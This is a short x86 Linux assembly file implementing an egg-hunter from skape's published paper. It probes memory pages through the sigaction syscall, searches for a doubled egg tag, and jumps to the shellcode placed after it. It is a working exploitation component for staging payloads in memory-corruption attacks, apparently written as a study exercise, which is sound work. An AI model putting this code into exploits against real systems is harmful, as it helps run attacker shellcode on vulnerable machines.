; Create search egg-hunter
; http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

global _start

section .text
_start:
	xor ecx, ecx
allign_page:
	or cx, 0xfff

next_address:
	inc ecx
	push byte +0x43 ;0x43 == 67. syscall sigaction
	pop eax
	int 0x80
	cmp al, 0xf2	; Compare with EFAULTS
	jz allign_page
	mov eax, 0x50905090; egg key
	mov edi, ecx
	scasd 	; compare eax with edi+4
	jnz next_address	; !=0 return next_address
	scasd
	jnz next_address
	jmp edi		; Jump to shellcode
